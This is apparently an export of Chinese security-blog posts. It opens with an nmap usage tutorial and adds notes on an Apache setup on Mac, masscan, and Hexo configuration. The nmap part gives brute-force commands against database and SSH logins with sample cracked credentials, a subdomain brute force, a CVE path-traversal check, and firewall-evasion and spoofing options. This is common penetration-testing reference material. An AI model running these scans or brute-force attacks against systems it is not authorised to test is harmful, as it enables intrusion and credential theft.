解释：CIDR 为你设置的子网掩码(/24 , /16 ,/8 等)12310.1.1.0/24 = 10.1.1.1-10.1.1.255 #c段扫描10.1.1.0/16 = 10.1.1.1-10.1.255.255 #b段扫描10.1.1.0/8 = 10.1.1.1-10.255.255.255 #a段扫描 从文件中读取需要扫描的IP列表1nmap -iL ip-address.txt 路由跟踪扫描路由器追踪功能，能够帮网络管理员了解网络通行情况，同时也是网络管理人员很好的辅助工具！通过路由器追踪可以轻松的查处从我们电脑所在地到目标地之间所经常的网络节点，并可以看到通过各个节点所花费的时间1nmap -traceroute www.baidu.com A OS识别,版本探测,脚本扫描和traceroute综合扫描此选项设置包含了1-10000的端口ping扫描，操作系统扫描，脚本扫描，路由跟踪，服务探测。12345nmap -A 10.130.1.43``` ![](http://image.3001.net/2017/07/4dab6997bdc8689a89aa90e792ac08a32.png) ## 命令混合式扫描命令混合扫描，可以做到类似参数-A所完成的功能，但又能细化到我们所需特殊要求。所以一般高手选择这个混合扫描 nmap -vv -p1-100,3306,3389 -O -traceroute 10.130.1.4312这些参数都是可以灵活调用的，具体根据具体的扫描来使用各个参数。 ![](http://image.3001.net/2017/07/00cc7fccb3dc60ebdedbe4e5bb77a9072.png) nmap -p1-65535 -sV -sS -T4 10.130.1.1341234使`SYN`扫描，并进行Version版本检测 使用T4(aggressive)的时间模板对目标ip的全端口进行扫描。## 输出格式扫描的结果输出到屏幕,同时会存储一份到grep-output.txt nmap -sV -p 139,445 -oG grep-output.txt 10.0.1.0/241扫描结果输出为html nmap -sS -sV -T5 10.0.1.99 –webxml -oX - | xsltproc –output file.html123# nmap高级用法之脚本使用## 按照脚本分类进行扫描 nmap –script 类别1234567891011121314151617181920nmap官方脚本文档: [https://nmap.org/nsedoc/](https://nmap.org/nsedoc/) ![](http://image.3001.net/2017/07/7822ed61bd955f648b1fae0408c09fa02.png) 左侧列出了脚本的分类，点击分类 可以看到每一个分类下有很多具体的脚本供我们使用。`nmap --script=类别`这里的类别，可以填写下面14大分类中的其中之一，也可以填写分类里面的具体漏洞扫描脚本。nmap脚本分类:```ruby- auth: 负责处理鉴权证书（绕开鉴权）的脚本 - broadcast: 在局域网内探查更多服务开启状况，如dhcp/dns/sqlserver等服务 - brute: 提供暴力破解方式，针对常见的应用如http/snmp等 - default: 使用-sC或-A选项扫描时候默认的脚本，提供基本脚本扫描能力 - discovery: 对网络进行更多的信息，如SMB枚举、SNMP查询等 - dos: 用于进行拒绝服务攻击 - exploit: 利用已知的漏洞入侵系统 - external: 利用第三方的数据库或资源，例如进行whois解析 - fuzzer: 模糊测试的脚本，发送异常的包到目标机，探测出潜在漏洞 - intrusive: 入侵性的脚本，此类脚本可能引发对方的IDS/IPS的记录或屏蔽- malware: 探测目标机是否感染了病毒、开启了后门等信息 - safe: 此类与intrusive相反，属于安全性脚本 - version: 负责增强服务与版本扫描（Version Detection）功能的脚本 - vuln: 负责检查目标机是否有常见的漏洞（Vulnerability），如是否有MS08_067 使用具体脚本进行扫描1nmap --script 具体的脚本 www.baidu.com 常用脚本使用案例扫描服务器的常见漏洞1nmap --script vuln &lt;target&gt; 检查FTP是否开启匿名登陆1234567891011nmap --script ftp-anon &lt;target&gt;PORT STATE SERVICE21/tcp open ftp| ftp-anon: Anonymous FTP login allowed (FTP code 230)| -rw-r--r-- 1 1170 924 31 Mar 28 2001 .banner| d--x--x--x 2 root root 1024 Jan 14 2002 bin| d--x--x--x 2 root root 1024 Aug 10 1999 etc| drwxr-srwt 2 1170 924 2048 Jul 19 18:48 incoming [NSE: writeable]| d--x--x--x 2 root root 1024 Jan 14 2002 lib| drwxr-sr-x 2 1170 924 1024 Aug 5 2004 pub|_Only 6 shown. Use --script-args ftp-anon.maxlist=-1 to see all. 对MySQL进行暴破解12345nmap --script=mysql-brute &lt;target&gt;3306/tcp open mysql| mysql-brute:| Accounts| root:root - Valid credentials 可以看出已经暴力成功破解了MySQL,在368秒内进行45061次猜测，平均TPS为146.5。 对MsSQL进行暴破解1234567891011nmap -p 1433 --script ms-sql-brute --script-args userdb=customuser.txt,passdb=custompass.txt &lt;host&gt;| ms-sql-brute:| [192.168.100.128\TEST]| No credentials found| Warnings:| sa: AccountLockedOut| [192.168.100.128\PROD]| Credentials found:| webshop_reader:secret =&gt; Login Success| testuser:secret1234 =&gt; PasswordMustChange|_ lordvader:secret1234 =&gt; Login Success 对Oracle数据库进行暴破解123456789nmap --script oracle-brute -p 1521 --script-args oracle-brute.sid=ORCL &lt;host&gt;PORT STATE SERVICE REASON1521/tcp open oracle syn-ack| oracle-brute:| Accounts| system:powell =&gt; Account locked| haxxor:haxxor =&gt; Valid credentials| Statistics|_ Perfomed 157 guesses in 8 seconds, average tps: 19 对pgSQL的暴力破解12345nmap -p 5432 --script pgsql-brute &lt;host&gt;5432/tcp open pgsql| pgsql-brute:| root:&lt;empty&gt; =&gt; Valid credentials|_ test:test =&gt; Valid credentials 对SSH进行暴力破解1234567nmap -p 22 --script ssh-brute --script-args userdb=users.lst,passdb=pass.lst --script-args ssh-brute.timeout=4s &lt;target&gt;22/ssh open ssh| ssh-brute:| Accounts| username:password| Statistics|_ Performed 32 guesses in 25 seconds. 利用DNS进行子域名暴力破解123456789101112131415161718192021nmap --script dns-brute www.baidu.comλ nmap --script dns-brute www.baidu.com Starting Nmap 7.50 ( https://nmap.org ) at 2017-07-25 13:12 ?Nmap scan report for www.baidu.com (180.97.33.108) Host is up (0.018s latency). Other addresses for www.baidu.com (not scanned): 180.97.33.10Not shown: 998 filtered ports PORT STATE SERVICE 80/tcp open http 443/tcp open https Host script results: | dns-brute: | DNS Brute-force hostnames: | admin.baidu.com - 10.26.109.19 | mx.baidu.com - 61.135.163.61 | svn.baidu.com - 10.65.211.174 | ads.baidu.com - 10.42.4.225 Nmap done: 1 IP address (1 host up) scanned in 92.64 seconds 额(⊙﹏⊙) 这个admin.baidu.com后面那个10.26.109.19难道真的是百度内网的管理平台地址？ 检查VMWare ESX，ESXi和服务器（CVE-2009-3733）中的路径遍历漏洞12345678910nmap --script http-vmware-path-vuln -p80,443,8222,8333 &lt;host&gt;| http-vmware-path-vuln:| VMWare path traversal (CVE-2009-3733): VULNERABLE| /vmware/Windows 2003/Windows 2003.vmx| /vmware/Pentest/Pentest - Linux/Linux Pentest Bravo.vmx| /vmware/Pentest/Pentest - Windows/Windows 2003.vmx| /mnt/vmware/vmware/FreeBSD 7.2/FreeBSD 7.2.vmx| /mnt/vmware/vmware/FreeBSD 8.0/FreeBSD 8.0.vmx| /mnt/vmware/vmware/FreeBSD 8.0 64-bit/FreeBSD 8.0 64-bit.vmx|_ /mnt/vmware/vmware/Slackware 13 32-bit/Slackware 13 32-bit.vmx 查询VMware服务器（vCenter，ESX，ESXi）SOAP API以提取版本信息。1234567891011121314151617λ nmap --script vmware-version -p443 10.0.1.4Starting Nmap 7.50 ( https://nmap.org ) at 2017-07-25 12:26 ?D1ú±ê×?ê±??Nmap scan report for 10.0.1.4Host is up (0.0019s latency).PORT STATE SERVICE443/tcp open https| vmware-version:| Server version: VMware ESXi 6.5.0| Build: 4887370| Locale version: INTL 000| OS type: vmnix-x86|_ Product Line ID: embeddedEsxService Info: CPE: cpe:/o:vmware:ESXi:6.5.0Nmap done: 1 IP address (1 host up) scanned in 6.28 seconds 参数详解Nmap支持主机名,ip,网段的表示方式例如:blah.highon.coffee, namp.org/24, 192.168.0.1;10.0.0-25.1-2541234-iL filename 从文件中读取待检测的目标,文件中的表示方法支持机名,ip,网段-iR hostnum 随机选取,进行扫描.如果-iR指定为0,则是无休止的扫描--exclude host1[, host2] 从扫描任务中需要排除的主机 --exculdefile exclude_file 排除文件中的IP,格式和-iL指定扫描文件的格式相同 主机发现1234567-sL 仅仅是显示,扫描的IP数目,不会进行任何扫描-sn ping扫描,即主机发现-Pn 不检测主机存活-PS/PA/PU/PY[portlist] TCP SYN Ping/TCP ACK Ping/UDP Ping发现-PE/PP/PM 使用ICMP echo, timestamp and netmask 请求包发现主机-PO[prococol list] 使用IP协议包探测对方主机是否开启 -n/-R 不对IP进行域名反向解析/为所有的IP都进行域名的反响解析 扫描技巧12345678-sS/sT/sA/sW/sM TCP SYN/TCP connect()/ACK/TCP窗口扫描/TCP Maimon扫描-sU UDP扫描-sN/sF/sX TCP Null，FIN，and Xmas扫描--scanflags 自定义TCP包中的flags-sI zombie host[:probeport] Idlescan-sY/sZ SCTP INIT/COOKIE-ECHO 扫描-sO 使用IP protocol 扫描确定目标机支持的协议类型-b “FTP relay host” 使用FTP bounce scan 指定端口和扫描顺序123456-p 特定的端口 -p80,443 或者 -p1-65535-p U:PORT 扫描udp的某个端口, -p U:53-F 快速扫描模式,比默认的扫描端口还少-r 不随机扫描端口,默认是随机扫描的--top-ports &quot;number&quot; 扫描开放概率最高的number个端口,出现的概率需要参考nmap-services文件,ubuntu中该文件位于/usr/share/nmap.nmap默认扫前1000个--port-ratio &quot;ratio&quot; 扫描指定频率以上的端口 服务版本识别12345-sV 开放版本探测,可以直接使用-A同时打开操作系统探测和版本探测--version-intensity &quot;level&quot; 设置版本扫描强度,强度水平说明了应该使用哪些探测报文。数值越高，服务越有可能被正确识别。默认是7--version-light 打开轻量级模式,为--version-intensity 2的别名--version-all 尝试所有探测,为--version-intensity 9的别名--version-trace 显示出详细的版本侦测过程信息 脚本扫描1234567-sC 根据端口识别的服务,调用默认脚本--script=”Lua scripts” 调用的脚本名--script-args=n1=v1,[n2=v2] 调用的脚本传递的参数--script-args-file=filename 使用文本传递参数--script-trace 显示所有发送和接收到的数据--script-updatedb 更新脚本的数据库--script-help=”Lua script” 显示指定脚本的帮助 OS识别123-O 启用操作系统检测,-A来同时启用操作系统检测和版本检测--osscan-limit 针对指定的目标进行操作系统检测(至少需确知该主机分别有一个open和closed的端口)--osscan-guess 推测操作系统检测结果,当Nmap无法确定所检测的操作系统时，会尽可能地提供最相近的匹配，Nmap默认进行这种匹配 防火墙/IDS躲避和哄骗123456789101112-f; --mtu value 指定使用分片、指定数据包的MTU.-D decoy1,decoy2,ME 使用诱饵隐蔽扫描-S IP-ADDRESS 源地址欺骗-e interface 使用指定的接口-g/ --source-port PROTNUM 使用指定源端口 --proxies url1,[url2],... 使用HTTP或者SOCKS4的代理 --data-length NUM 填充随机数据让数据包长度达到NUM--ip-options OPTIONS 使用指定的IP选项来发送数据包--ttl VALUE 设置IP time-to-live域--spoof-mac ADDR/PREFIX/VEBDOR MAC地址伪装--badsum 使用错误的checksum来发送数据包 Nmap 输出1234567891011121314151617-oN 将标准输出直接写入指定的文件-oX 输出xml文件-oS 将所有的输出都改为大写-oG 输出便于通过bash或者perl处理的格式,非xml-oA BASENAME 可将扫描结果以标准格式、XML格式和Grep格式一次性输出-v 提高输出信息的详细度-d level 设置debug级别,最高是9--reason 显示端口处于带确认状态的原因--open 只输出端口状态为open的端口--packet-trace 显示所有发送或者接收到的数据包--iflist 显示路由信息和接口,便于调试--log-errors 把日志等级为errors/warings的日志输出--append-output 追加到指定的文件--resume FILENAME 恢复已停止的扫描--stylesheet PATH/URL 设置XSL样式表，转换XML输出--webxml 从namp.org得到XML的样式--no-sytlesheet 忽略XML声明的XSL样式表 其他nmap选项12345678-6 开启IPv6-A OS识别,版本探测,脚本扫描和traceroute--datedir DIRNAME 说明用户Nmap数据文件位置--send-eth / --send-ip 使用原以太网帧发送/在原IP层发送--privileged 假定用户具有全部权限--unprovoleged 假定用户不具有全部权限,创建原始套接字需要root权限-V 打印版本信息-h 输出帮助]]></content>
      <categories>
        <category>hacker</category>
      </categories>
      <tags>
        <tag>国光</tag>
        <tag>nmap</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Mac OS下开启自带的apache服务]]></title>
    <url>%2F2017%2F07%2Fmacapache.html</url>
    <content type="text"><![CDATA[记录了Mac OS下使用apache服务遇到的一个坑，最后发现是新版本Mac OS策略改变的问题，最后在国外某个论坛上最终找到了解决方法，特此既记录之。 Apache路径1/etc/apache2/ 1234[root@GGs-MacBook-Pro:/Volumes/SSD/blog#cd /etc/apache2/[root@GGs-MacBook-Pro:/etc/apache2#lsextra httpd.conf.pre-update mime.types otherhttpd.conf magic original users 启动服务12sudo apachectl start/restart #启动apachesudo apachectl stop #停止apache 发现apache已经可以正常工作了，接下来修改默认的 网站路径。 修改默认网站目录修改配置文件Mac下apache默认的网站路径是/Library/WebServer/Documents我们来修改/etc/apache2/httpd.conf找到DocumentRoot这行来进行修改。1[root@GGs-MacBook-Pro:/etc/apache2#vim /etc/apache2/httpd.conf 然后改为我们自己的网站路径的配置文件。 重启apache来生效1sudo apachectl restart 效果这个是什么情况???报了如下错了:1You don&apos;t have permission to access / on this server. 表急 是我一开始想的太简单了，不能灰心！查看apache报错日志:cat /private/var/log/apache2/error_log得到如下的报错信息1client denied by server configuration 然后根据这个报错，Google了下找到了国外的几个论坛，最终解决了问题。 解决Mac下apache 403的问题网上查资料发现是因为Mac版本升级导致了apache策略发生变更了，所以我们修改后还是会出现403无权访问的情况。解决方法:备份原有的httpd.conf配置文件,把同级目录下的httpd.conf.pre-update 重命名为httpd.conf然后在修改默认的网站根目录需要修改原来的默认路径，然后改为自己的路径。全文搜索 只有这2处是/Library/WebServer/Documents 然后查找替换了下。 再次重启apache1sudo apachectl restart Mac和Linux都有一个共同的特点:凡是修改过配置文件的服务，当我们修改过后 必须重启服务 才可以生效。 最终效果]]></content>
      <categories>
        <category>others</category>
      </categories>
      <tags>
        <tag>国光</tag>
        <tag>MacOS</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[利用Masscan批量生成IP地址表]]></title>
    <url>%2F2017%2F07%2Fmasscan.html</url>
    <content type="text"><![CDATA[简介Masscan是Kali下集成的高效扫描器，和nmap命令有很多相似之处 命令生成随机ip123masscan -sL 10.0.0.0/24 &gt; c段.txtmasscan -sL 10.0.0.0/16 &gt; b段.txtmasscan -sL 10.0.0.0/8 &gt; a段.txt sL:显示扫描的所有主机的列表&gt; xx.txt:把终端命令行中的结果保存在xx.txt文件中]]></content>
      <categories>
        <category>hacker</category>
      </categories>
      <tags>
        <tag>国光</tag>
        <tag>IP</tag>
        <tag>Masscan</tag>
        <tag>脚本</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Hexo博客配置笔记]]></title>
    <url>%2F2017%2F07%2Fhexo.html</url>
    <content type="text"><![CDATA[记录以前配置Hexo走过的坑，避免重复造轮子，方便以后自己再次配置Hexo用来参考使用。 前言每次更换系统的时候都会导致的我的hexo博客得重新配置一遍，每次都得去对照next主题的官方文档去配置，很耗时间。所以为了避免重复造轮子，所以这里我就把已经配置好配置文件参数贴上，这样在下次配置的时候就不会再那么耗时间了。 安装Hexo123npm install hexo-cli -gcd /bloghexo init 安装next主题1git clone https://github.com/iissnan/hexo-theme-next themes/next 站点配置文件_config.yml123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687# Hexo Configuration## Docs: https://hexo.io/docs/configuration.html## Source: https://github.com/hexojs/hexo/# Sitetitle: 国光subtitle: 安安静静写博客description: 宁静致远author: 国光language: zh-Hanstimezone: Asia/Shanghai# URL## If your site is put in a subdirectory, set url as 'http://yoursite.com/child' and root as '/child/'url: http://www.sqlsec.com/root: /permalink: :year/:month/:title.htmlpermalink_defaults:# Directorysource_dir: sourcepublic_dir: publictag_dir: tagsarchive_dir: archivescategory_dir: categoriescode_dir: downloads/codei18n_dir: :langskip_render:# Writingnew_post_name: :title.md # File name of new postsdefault_layout: posttitlecase: false # Transform title into titlecaseexternal_link: true # Open external links in new tabfilename_case: 0render_drafts: falsepost_asset_folder: falserelative_link: falsefuture: truehighlight: enable: true line_number: true auto_detect: false tab_replace: # Home page setting# path: Root path for your blogs index page. (default = '')# per_page: Posts displayed per page. (0 = disable pagination)# order_by: Posts order. (Order by date descending by default)index_generator: path: '' per_page: 10 order_by: -date # Category &amp; Tagdefault_category: uncategorizedcategory_map:tag_map:# Date / Time format## Hexo uses Moment.js to parse and display date## You can customize the date format as defined in## http://momentjs.com/docs/#/displaying/format/date_format: YYYY-MM-DDtime_format: HH:mm:ss# Pagination## Set per_page to 0 to disable paginationper_page: 10pagination_dir: page# Searchsearch: path: search.xml field: post format: html limit: 10000# Extensions## Plugins: https://hexo.io/plugins/## Themes: https://hexo.io/themes/theme: next# Deployment## Docs: https://hexo.io/docs/deployment.htmldeploy: type: git repo: https://github.com/tezukanice/tezukanice.github.io.git brachanc: master next完整的配置文件123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276277278279280281282283284285286287288289290291292293294295296297298299300301302303304305306307308309310311312313314315316317318319320321322323324325326327328329330331332333334335336337338339340341342343344345346347348349350351352353354355356357358359360361362363364365366367368369370371372373374375376377378379380381382383384385386387388389390391392393394395396397398399400401402403404405406407408409410411412413414415416417418419420421422423424425426427428429430431432433434435436437438439440441442443444445446447448449450451452453454455456457458459460461462463464465466467468469470471472473474475476477478479480481482483484485486487488489490491492493494495496497498499500501502503504505506507508509510511512513514515516517518519520521522523524525526527528529530531532533534535536537538539540541542543544545546547548549550551552553554555556557558559560561562563564565566567568569570571572573574575576577578579580581582583584585586587588589590591592593594595596597598599600601602603604605606607608609610611612613614615616617618619620621622623624625626627628629# ---------------------------------------------------------------# Site Information Settings# ---------------------------------------------------------------# Put your favicon.ico into `hexo-site/source/` directory.favicon: /images/guo.png# Set default keywords (Use a comma to separate)keywords: "国光,信息安全,CTF,渗透测试"# Set rss to false to disable feed link.# Leave rss as empty to use site's feed link.# Set rss to specific value if you have burned your feed already.rss: /atom.xml# Specify the date when the site was setupsince: 2016# icon between year and author @Footerauthoricon: heart# Footer `powered-by` and `theme-info` copyrightcopyright: true# ---------------------------------------------------------------# SEO Settings# ---------------------------------------------------------------# Canonical, set a canonical link tag in your hexo, you could use it for your SEO of blog.# See: https://support.google.com/webmasters/answer/139066# Tips: Before you open this tag, remember set up your URL in hexo _config.yml ( ex. url: http://yourdomain.com )canonical: true# Change headers hierarchy on site-subtitle (will be main site description) and on all post/pages titles for better SEO-optimization.seo: false# If true, will add site-subtitle to index page, added in main hexo config.# subtitle: Subtitleindex_with_subtitle: false# ---------------------------------------------------------------# Menu Settings# ---------------------------------------------------------------# When running the site in a subdirectory (e.g. domain.tld/blog), remove the leading slash (/archives -&gt; archives)menu: home: / CTF: /categories/CTF/ hacker: /categories/hacker/ others: /categories/others/ archives: /archives/ tags: /tags/ about: /about/ #sitemap: /sitemap.xml #commonweal: /404.html# Enable/Disable menu icons.# Icon Mapping:# Map a menu item to a specific FontAwesome icon name.# Key is the name of menu item and value is the name of FontAwesome icon. Key is case-senstive.# When an question mask icon presentißßng up means that the item has no mapping icon.menu_icons: enable: true #KeyMapsToMenuItemKey: NameOfTheIconFromFontAwesome home: home about: user categories: th schedule: calendar tags: tags archives: archive sitemap: sitemap commonweal: heartbeat CTF: flag others: tags hacker: tags# ---------------------------------------------------------------# Scheme Settings# ---------------------------------------------------------------# Schemes#scheme: Musescheme: Mist#scheme: Pisces# ---------------------------------------------------------------# Sidebar Settings# ---------------------------------------------------------------# Social Links# Key is the link label showing to end users.# Value is the target link (E.g. GitHub: https://github.com/iissnan)social: 微博: http://weibo.com/u/5728586656 GitHub: https://www.github.com/tezukanice/ 知乎: https://www.zhihu.com/people/guo-guang-94/activities# Social Links Icons# Icon Mapping:# Map a menu item to a specific FontAwesome icon name.# Key is the name of the item and value is the name of FontAwesome icon. Key is case-senstive.# When an globe mask icon presenting up means that the item has no mapping icon.social_icons: enable: true # Icon Mappings. # KeyMapsToSocialItemKey: NameOfTheIconFromFontAwesome GitHub: github Twitter: twitter 微博: weibo 知乎: tags# Blog rollslinks_title: 友情链接#links_layout: blocklinks_layout: inlinelinks: Demon: http://www.ggsec.cn/# Sidebar Avatar# in theme directory(source/images): /images/avatar.jpg# in site directory(source/uploads): /uploads/avatar.jpgavatar: http://ombgvjpli.bkt.clouddn.com/guoguang11.jpg# Table Of Contents in the Sidebartoc: enable: true # Automatically add list number to toc. number: true # If true, all words will placed on next lines if header width longer then sidebar width. wrap: false# Creative Commons 4.0 International License.# http://creativecommons.org/# Available: by | by-nc | by-nc-nd | by-nc-sa | by-nd | by-sa | zero#creative_commons: by-nc-sa#creative_commons:sidebar: # Sidebar Position, available value: left | right position: left #position: right # Sidebar Display, available value: # - post expand on posts automatically. Default. # - always expand for all pages automatically # - hide expand only when click on the sidebar toggle icon. # - remove Totally remove sidebar including sidebar toggle. #display: post display: always #display: hide #display: remove # Sidebar offset from top menubar in pixels. offset: 12 offset_float: 0 # Back to top in sidebar b2t: false # Scroll percent label in b2t button scrollpercent: false # Enable sidebar on narrow view onmobile: false# ---------------------------------------------------------------# Post Settings# ---------------------------------------------------------------# Automatically scroll page to section which is under &lt;!-- more --&gt; mark.scroll_to_more: true# Automatically saving scroll position on each post/page in cookies.save_scroll: false# Automatically excerpt description in homepage as preamble text.excerpt_description: true# Automatically Excerpt. Not recommend.# Please use &lt;!-- more --&gt; in the post to control excerpt accurately.auto_excerpt: enable: false length: 150# Post meta display settingspost_meta: item_text: true created_at: true updated_at: false categories: true# Post wordcount display settings# Dependencies: https://github.com/willin/hexo-wordcountpost_wordcount: item_text: true wordcount: false min2read: false separated_meta: true# Wechat Subscriberwechat_subscriber: enabled: true qcode: http://ombgvjpli.bkt.clouddn.com/weixingg.png description: 听说最近流行打赏~~ 先跟风一波~~# Declare license on postspost_copyright: enable: false license: CC BY-NC-SA 3.0 license_url: https://creativecommons.org/licenses/by-nc-sa/3.0/# ---------------------------------------------------------------# Misc Theme Settings# ---------------------------------------------------------------# Custom Logo.# !!Only available for Default Scheme currently.# Options:# enabled: [true/false] - Replace with specific image# image: url-of-image - Images's urlcustom_logo: enabled: false image:# Code Highlight theme# Available value:# normal | night | night eighties | night blue | night bright# https://github.com/chriskempson/tomorrow-themehighlight_theme: night eighties# ---------------------------------------------------------------# Font Settings# - Find fonts on Google Fonts (https://www.google.com/fonts)# - All fonts set here will have the following styles:# light, light italic, normal, normal italic, bold, bold italic# - Be aware that setting too much fonts will cause site running slowly# - Introduce in 5.0.1# ---------------------------------------------------------------font: enable: true # Uri of fonts host. E.g. //fonts.googleapis.com (Default) host: # Global font settings used on &lt;body&gt; element. global: # external: true will load this font family from host. external: true family: Lato # Font settings for Headlines (h1, h2, h3, h4, h5, h6) # Fallback to `global` font settings. headings: external: true family: # Font settings for posts # Fallback to `global` font settings. posts: external: true family: # Font settings for Logo # Fallback to `global` font settings. # The `size` option use `px` as unit logo: external: true family: size: # Font settings for &lt;code&gt; and code blocks. codes: external: true family: size:# ---------------------------------------------------------------# Third Party Services Settings# ---------------------------------------------------------------# MathJax Supportmathjax: enable: false per_page: false cdn: //cdn.bootcss.com/mathjax/2.7.1/latest.js?config=TeX-AMS-MML_HTMLorMML# Han Support docs: https://hanzi.pro/han: false# Swiftype Search API Key#swiftype_key:# Baidu Analytics ID#baidu_analytics:# Duoshuo ShortName#duoshuo_shortname:# Disqusdisqus: enable: false shortname: count: true# Hypercomments#hypercomments_id:# changyanchangyan: enable: false appid: appkey:# Support for youyan comments system.# You can get your uid from http://www.uyan.cc#youyan_uid: your uid# Support for LiveRe comments system.# You can get your uid from https://livere.com/insight/myCode (General web site)livere_uid: MTAyMC8yOTU5Ny82MTY1# Baidu Share# Available value:# button | slide# Warning: Baidu Share does not support https.#baidushare:## type: button# Share#jiathis:# Warning: JiaThis does not support https.#add_this_id:# Share#duoshuo_share: true# Google Webmaster tools verification setting# See: https://www.google.com/webmasters/#google_site_verification:# Google Analytics#google_analytics:# Yandex Webmaster tools verification setting# See: https://webmaster.yandex.ru/#yandex_site_verification:# CNZZ count#cnzz_siteid:# Application Insights# See https://azure.microsoft.com/en-us/services/application-insights/# application_insights:# Make duoshuo show UA# user_id must NOT be null when admin_enable is true!# you can visit http://dev.duoshuo.com get duoshuo user id.#duoshuo_info: # ua_enable: tfalse # admin_enable: false #user_id: 0 #admin_nickname: Author# Facebook SDK Support.# https://github.com/iissnan/hexo-theme-next/pull/410facebook_sdk: enable: false app_id: #&lt;app_id&gt; fb_admin: #&lt;user_id&gt; like_button: #true webmaster: #true# Facebook comments plugin# This plugin depends on Facebook SDK.# If facebook_sdk.enable is false, Facebook comments plugin is unavailable.facebook_comments_plugin: enable: false num_of_posts: 10 # min posts num is 1 width: 100% # default width is 550px scheme: light # default scheme is light (light or dark)# VKontakte API Support.# To get your AppID visit https://vk.com/editapp?act=createvkontakte_api: enable: false app_id: #&lt;app_id&gt; like: true comments: true num_of_posts: 10# Star rating support to each article.# To get your ID visit https://widgetpack.comrating: enable: false id: #&lt;app_id&gt; color: fc6423# Show number of visitors to each article.# You can visit https://leancloud.cn get AppID and AppKey.leancloud_visitors: enable: false app_id: #&lt;app_id&gt; app_key: #&lt;app_key&gt;# Show PV/UV of the website/page with busuanzi.# Get more information on http://ibruce.info/2015/04/04/busuanzi/busuanzi_count: # count values only if the other configs are false enable: true # custom uv span for the whole site site_uv: true site_uv_header: &lt;i class="fa fa-user"&gt;访客数&lt;/i&gt; site_uv_footer: # custom pv span for the whole site site_pv: true site_pv_header: &lt;i class="fa fa-eye"&gt;阅读数&lt;/i&gt; site_pv_footer: # custom pv span for one page only page_pv: true page_pv_header: &lt;i class="fa fa-eye"&gt;浏览数&lt;/i&gt; page_pv_footer:# Tencent analytics ID# tencent_analytics:# Tencent MTA ID# tencent_mta:# Enable baidu push so that the blog will push the url to baidu automatically which is very helpful for SEObaidu_push: false# Google Calendar# Share your recent schedule to others via calendar page## API Documentation:# https://developers.google.com/google-apps/calendar/v3/reference/events/listcalendar: enable: false calendar_id: &lt;required&gt; api_key: &lt;required&gt; orderBy: startTime offsetMax: 24 offsetMin: 4 timeZone: showDeleted: false singleEvents: true maxResults: 250# Algolia Searchalgolia_search: enable: false hits: per_page: 10 labels: input_placeholder: Search for Posts hits_empty: "We didn't find any results for the search: $&#123;query&#125;" hits_stats: "$&#123;hits&#125; results found in $&#123;time&#125; ms"# Local search# Dependencies: https://github.com/flashlab/hexo-generator-searchlocal_search: enable: true # if auto, trigger search by changing input # if manual, trigger search by pressing enter key or search button trigger: auto # show top n results per article, show all results by setting to -1 top_n_per_article: 1# ---------------------------------------------------------------# Tags Settings# ---------------------------------------------------------------# External URL with BASE64 encrypt &amp; decrypt# Usage: &#123;% exturl text url "title" %&#125;# Alias: &#123;% extlink text url "title" %&#125;exturl: false#! ---------------------------------------------------------------#! DO NOT EDIT THE FOLLOWING SETTINGS#! UNLESS YOU KNOW WHAT YOU ARE DOING#! ---------------------------------------------------------------# Motionuse_motion: true# Fancyboxfancybox: true# Progress bar in the top during page loading.pace: false# Themes list:#pace-theme-big-counter#pace-theme-bounce#pace-theme-barber-shop#pace-theme-center-atom#pace-theme-center-circle#pace-theme-center-radar#pace-theme-center-simple#pace-theme-corner-indicator#pace-theme-fill-left#pace-theme-flash#pace-theme-loading-bar#pace-theme-mac-osx#pace-theme-minimal# For example# pace_theme: pace-theme-center-simplepace_theme: pace-theme-minimal# Canvas-nestcanvas_nest: true# three_wavesthree_waves: false# canvas_linescanvas_lines: false# canvas_spherecanvas_sphere: false# Only fit scheme Pisces# Canvas-ribboncanvas_ribbon: false# Script Vendors.# Set a CDN address for the vendor you want to customize.# For example# jquery: https://ajax.googleapis.com/ajax/libs/jquery/2.2.0/jquery.min.js# Be aware that you should use the same version as internal ones to avoid potential problems.# Please use the https protocol of CDN files when you enable https on your site.vendors: # Internal path prefix. Please do not edit it. _internal: lib # Internal version: 2.1.3 jquery: # Internal version: 2.1.5 # See: http://fancyapps.com/fancybox/ fancybox: fancybox_css: # Internal version: 1.0.6 # See: https://github.com/ftlabs/fastclick fastclick: # Internal version: 1.9.7 # See: https://github.com/tuupola/jquery_lazyload lazyload: # Internal version: 1.2.1 # See: http://VelocityJS.org velocity: # Internal version: 1.2.1 # See: http://VelocityJS.org velocity_ui: # Internal version: 0.7.9 # See: https://faisalman.github.io/ua-parser-js/ ua_parser: # Internal version: 4.6.2 # See: http://fontawesome.io/ fontawesome: # Internal version: 1 # https://www.algolia.com algolia_instant_js: algolia_instant_css: # Internal version: 1.0.2 # See: https://github.com/HubSpot/pace # Or use direct links below: # pace: //cdn.bootcss.com/pace/1.0.2/pace.min.js # pace_css: //cdn.bootcss.com/pace/1.0.2/themes/blue/pace-theme-flash.min.css pace: pace_css: # Internal version: 1.0.0 # https://github.com/hustcc/canvas-nest.js canvas_nest: # three three: # three_waves # https://github.com/jjandxa/three_waves three_waves: # three_waves # https://github.com/jjandxa/canvas_lines canvas_lines: # three_waves # https://github.com/jjandxa/canvas_sphere canvas_sphere: # Internal version: 1.0.0 # https://github.com/zproo/canvas-ribbon canvas_ribbon: # Internal version: 3.3.0 # https://github.com/ethantw/Han han:# Assetscss: cssjs: jsimages: images# Theme versionversion: 5.1.1 Hexo插件的安装12345npm install hexo-generator-feed --save #RSSnpm install hexo-deployer-git --save #git部署npm install hexo-generator-searchdb --save #搜索npm install hexo-generator-seo-friendly-sitemap --save #sitemapnpm install hexo-generator-baidu-sitemap --save #百度sitemap 同步到Github生成ssh keys1ssh-keygen -t rsa -C "admin@sqlsec.com" 添加 SSH Key 到 GitHub1code@GGs-MacBook-Pro:~$cat .ssh/id_rsa.pub 